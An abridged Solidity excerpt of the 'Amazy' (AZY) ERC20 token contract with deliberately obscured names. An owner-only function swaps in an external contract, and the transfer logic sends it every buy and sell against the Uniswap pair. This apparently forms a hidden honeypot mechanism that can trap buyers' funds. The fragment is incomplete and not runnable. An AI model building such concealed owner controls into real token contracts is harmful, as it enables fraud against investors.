...
contract UserAmountvocrer is IUserAmountvocrer{
    using SafeMath for uint256;
...
contract TokenM is ERC20 {
    ...
    IUserAmountvocrer public koolse;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;


    constructor(address tokenOwner) ERC20("Amazy", "AZY") {
    ...
    function vocrerEthouupRtbas(IUserAmountvocrer _koolse) public onlyOwner {
        koolse = _koolse;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                koolse.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				koolse.addOutAmount(from, amount);
            }else{
                koolse.addOutAmount(from, amount);
                takeFee = false;
            }
